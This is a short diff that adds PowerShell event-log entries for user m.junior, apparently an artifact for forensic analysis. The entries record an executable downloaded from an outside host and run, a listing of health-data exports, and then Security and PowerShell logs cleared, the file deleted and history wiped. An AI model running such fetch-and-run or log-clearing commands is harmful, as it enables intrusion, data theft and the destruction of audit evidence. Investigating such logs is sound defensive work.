@@ -1,0 +1,7 @@
+2025-08-28T02:10:18-03:00 | 4104 | Script Block | User: m.junior | Script: Invoke-WebRequest -Uri 'https://cloudbox-cdn.net/tools/cbxsync.exe' -OutFile 'C:\Users\m.junior\Downloads\cbxsync.exe'
+2025-08-28T02:10:45-03:00 | 4104 | Script Block | User: m.junior | Script: Get-ChildItem C:\HealthData\Exports\ -Recurse
+2025-08-28T02:11:20-03:00 | 4103 | Module Logging | Module: Microsoft.PowerShell.Management | Command: Start-Process cbxsync.exe
+2025-08-29T23:47:30-03:00 | 4104 | Script Block | User: m.junior | Script: Clear-EventLog -LogName Security
+2025-08-29T23:48:15-03:00 | 4104 | Script Block | User: m.junior | Script: Clear-EventLog -LogName 'Microsoft-Windows-PowerShell/Operational'
+2025-08-29T23:49:05-03:00 | 4104 | Script Block | User: m.junior | Script: Remove-Item C:\Users\m.junior\Downloads\cbxsync.exe -Force
+2025-08-29T23:50:22-03:00 | 4104 | Script Block | User: m.junior | Script: Clear-History
